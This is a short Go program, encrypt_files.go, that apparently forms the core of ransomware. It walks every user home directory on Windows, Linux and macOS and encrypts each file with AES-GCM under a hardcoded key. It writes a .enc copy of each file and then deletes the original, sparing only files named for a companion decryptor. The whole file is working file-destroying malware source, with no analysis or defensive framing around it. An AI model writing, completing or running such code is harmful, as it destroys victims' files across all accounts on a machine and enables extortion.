// encrypt_files.go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func main() {
	
	secretKey := "MyVerySecretKeyForEncryption1234"

	userDirectories := getUserDirectories()

	for _, directory := range userDirectories {
		err := filepath.Walk(directory, func(path string, f os.FileInfo, err error) error {
			return visit(path, f, err, []byte(secretKey), true)
		})

		if err != nil {
			fmt.Println("Error:", err)
		}
	}
}

func visit(path string, f os.FileInfo, err error, key []byte, encrypt bool) error {
	if err != nil {
		fmt.Println("Error:", err)
		return nil
	}

	if !f.IsDir() {
		if encrypt {
			if !strings.Contains(path, "decrypt_files_linux") {
				fmt.Println("Encrypting file:", path)
				err := encryptFile(path, key)
				if err != nil {
					fmt.Println("Encryption error:", err)
				} else {
					//Delete the original file after successful encryption
					os.Remove(path)
				}
			} else {
				fmt.Println("Skipping file:", path)
			}
		}
	}

	return nil
}

func getUserDirectories() []string {
	switch runtime.GOOS {
	case "windows":
		drives, _ := windowsDrives()
		var userDirs []string
		for _, drive := range drives {
			userDirs = append(userDirs, drive+"\\Users\\")
		}
		return userDirs
	case "linux":
		return []string{"/home/"}
	case "darwin":
		return []string{"/Users/"}
	default:
		return []string{}
	}
}

func windowsDrives() ([]string, error) {
	cmd := exec.Command("wmic", "logicaldisk", "get", "name")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return nil, err
	}
	driveStrings := strings.Fields(out.String())
	return driveStrings[1:], nil
}

func encryptFile(inputFile string, key []byte) error {
	plainText, err := ioutil.ReadFile(inputFile)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, plainText, nil)
	err = ioutil.WriteFile(inputFile+".enc", ciphertext, 0777)
	if err != nil {
		return err
	}

	return nil
}
